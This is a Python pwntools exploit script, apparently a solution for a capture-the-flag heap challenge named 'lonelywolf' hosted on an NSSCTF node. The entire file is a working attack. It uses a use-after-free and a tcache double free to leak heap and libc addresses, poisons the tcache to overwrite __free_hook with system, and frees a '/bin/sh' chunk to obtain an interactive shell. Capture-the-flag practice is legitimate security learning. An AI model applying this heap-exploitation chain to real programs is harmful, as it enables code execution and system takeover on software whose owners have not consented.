from pwn import *
import sys
remote_addr = ["node4.anna.nssctf.cn",28370]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./lonelywolf_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sla(b'choice: ', str(idx).encode())

def add(idx, size):
    menu(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(size).encode())

def edit(idx, content):
    menu(2)
    sla(b'Index: ', str(idx).encode())
    sla(b'Content: ', content)

def show(idx):
    menu(3)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    menu(4)
    sla(b'Index: ', str(idx).encode())

debug('''
    b *$rebase(0xbf1)
    b *$rebase(0xca9)
''')

add(0, 0x78)
delete(0)
edit(0, p64(0) * 2)
delete(0)
show(0)

heap_base = u64(ru(b'\x0a')[-7:-1].ljust(8, b'\x00')) - 0x260
pr('heap_base', heap_base)

edit(0, p64(heap_base + 0x10))
add(0, 0x78)
add(0, 0x78)
edit(0, b'\x00' * 35 + b'\x07')
delete(0)
show(0)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 96 - libc.sym['main_arena']
pr('libc_base', libc.address)

one = libc.address + 0x10a41c
free_hook = libc.sym['__free_hook']
system = libc.sym['system']

edit(0, b'\x01\x01' + b'\xff' * 0x3e + p64(free_hook) + p64(heap_base + 0x260))
add(0, 0x10)
edit(0, p64(system))
add(0, 0x20)
edit(0, b'/bin/sh\x00')
delete(0)


shell()
